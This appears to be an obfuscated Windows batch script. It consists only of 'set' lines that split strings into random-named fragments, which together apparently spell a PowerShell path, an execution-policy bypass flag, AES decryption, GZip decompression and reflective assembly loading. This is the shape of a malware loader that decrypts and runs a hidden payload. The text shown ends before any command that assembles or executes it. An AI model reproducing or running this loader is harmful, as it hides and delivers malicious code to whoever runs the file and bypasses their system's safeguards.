@echo off
set "mqoiHyHLOv=1."
set "PDTSpOLgvQ=s\"
set "bPemYrdKuo=\W"
set "XfZTVxwSSc=in"
set "QFejTpjVJd=nd"
set "UigXGnLmTe=em"
set "JKbWmSpPuq=xe"
set "TzZGMzkzyo=ll"
set "VQZBToIWFz=he"
set "IeUEGaGRXN= /"
set "CYvRLGHcCC=y "
set "XYIrChEhLi=po"
set "AGyJmMxUgO=rs"
set "uxYvFplNsP=rS"
set "OBNdFePmwy=0\"
set "EdATxxtiKU=32"
set "FCPypzPQqU=Sy"
set "jbRFgydHXa=Po"
set "aiHauRFvgM=ow"
set "bApIhzSSVn=we"
set "dpiWYqAYfQ=.e"
set "NCWmqLXGLZ=do"
set "nlXLTLdwZR=\v"
set "HpILYhsmfa=ll"
set "LEFqLjMgpA=py"
set "IornFqbAez=we"
set "GRKanQICgy=co"
set "kyFBtAEnJv=Wi"
set "eUZjjYtjnx=:\"
set "nqHOqjQzUg= C"
set "OxzjxbQFhC=st"
set "tCTETLLrfS=he"
set "IIUmAfeTYo=ws"
set "gnEJKqPUug=cd"
set "lXOfSaaxuh= %~dp0"
set "RKWUanpikv=n ''"
set "YoxOJNdltD=;$tu"
set "TjTfzebJHx=mVHE"
set "DmZCgBnLAy=$tuU"
set "IYERAVRwuD=Syst"
set "srsTuWAVwF=VHEs"
set "uMLwnrdsoJ=.Key"
set "vKLgwqKedQ=stem"
set "NOltaJcPBk=v.Pa"
set "bUzNjybjvY=s, 0"
set "CIZcOqoaLF=-1.."
set "STzOLsYpVL=dHTv"
set "ExonirlkjI=ress"
set "bEJBcUnRkM=rofi"
set "EPiRJdESPo=A.Su"
set "vkRsVsKRbF=onve"
set "aYgMThygNE=ach "
set "hyjPgaPYBk=TllA"
set "CXsGfJbpYQ=New-"
set "vMsmMKbRWJ=Tv.I"
set "mhJMRkHodR=::De"
set "dsBVvhXoNC=djAo"
set "uLJgxTioDY= = ["
set "FftswJwJCP=join"
set "uJRCEuAZOX= if "
set "nHEuJDRNyz=S46e"
set "BxbzmqMiNn='[-1"
set "iwJIefgZek=AJ.T"
set "rqXrTicQvM=ispo"
set "LASDpkYpHT=RmAx"
set "kgITEoVhrg=UAJ "
set "taZtKpDttY=$Pdj"
set "TUBMKxtOTE=ddin"
set "vAqdWAKXoe=);$o"
set "NrazrTZzUX=gjYA"
set "bcqoDZHMfc=dj0C"
set "EcTehtvTeW=eam("
set "xsqoPMgMAm=th('"
set "ftHPZQsNyZ=File"
set "dcTobRXQRG=null"
set "qDoWVdopwV=PTtG"
set "KvgTYuBerv=ress"
set "hqZfVYHzlP=-Obj"
set "XOBwuREQLV=vert"
set "AjBqJDfINi=3); "
set "yPDGUAvJmk=tS46"
set "KjHIaXQANI=orF'"
set "SWwDUZdceA=stem"
set "iKXRnVSrjI=('Tg"
set "SVxWrAmyrT=MuJg"
set "uxNBbrmxgy=stem"
set "FtsmTjgwMs=y.Pa"
set "diiMVAHWKz=gth)"
set "ZukzgoSywJ=ose("
set "fkXlCmYmrx=tem."
set "TMxhzCMDKY='0Pg"
set "PZLRzgzKqd=ptog"
set "kXJYfPMPol=VgA "
set "zDRnzjOOBJ=$odH"
set "ScefWVmXgZ=form"
set "jcgQgrJkPh=ode]"
set "bdIhafYerD=ne);"
set "wUPkDWdikW=yste"
set "vzphvXOfsd=-ep "
set "jHdwVdohHd=G) {"
set "rnBFGdcpAa=yste"
set "tNayHoJIHd=DuF "
set "jwYSYuXvZb=uJg."
set "IbucvPXqxJ=);$S"
set "SwuFDwpTZh=am;$"
set "XsMWdRhuvF=Comp"
set "seVurfgDcP=n ''"
set "MynIDcKQPT=Invo"
set "kYgbKqGUim=ecry"
set "loXztLYiVM=flec"
set "MKTFVSVuSm=yste"
set "SysCnJHAjs=:('g"
set "vQzfvJUYSK=)($m"
set "cXKaDtHUPL=SbMZ"
set "XjeeXMyTuK=.Cre"
set "HSqMhNCelj=JyDv"
set "FSNukbMorV=lit("
set "TJxmEBbfyG=ss -"
set "VOHybLOheX='txe"
set "VdIIRaURqF=106u"
set "sQwOWhfkqz=rity"
set "dmZtmanDlG=F'[-"
set "TMLwlVmvtC=le  "
set "dFKVSnwMtF=P = "
set "zUZQqPbRdi=y.Cr"
set "JdvQokzNZh=[Sys"
set "QWdnDfpyhA=ct S"
set "rROffLspNU=)) {"
set "EcVWaFPlbz=zuZI"
set "kKfZTwazWt=m.IO"
set "gGZiPjyBVU=$SbM"
set "efpSwhXpQS=embl"
set "gNzrUFKKyC= '')"
set "AFaBLUZKGc=$Pdj"
set "PXIZOWlVPY=; };"
set "xKtTUAVMXF=em.I"
set "jpddfGVVbK=PxEW"
set "mkPJrHOeIT=[Sys"
set "IGWIhYyzMM=-4] "
set "mqcENCXEXu=;$fj"
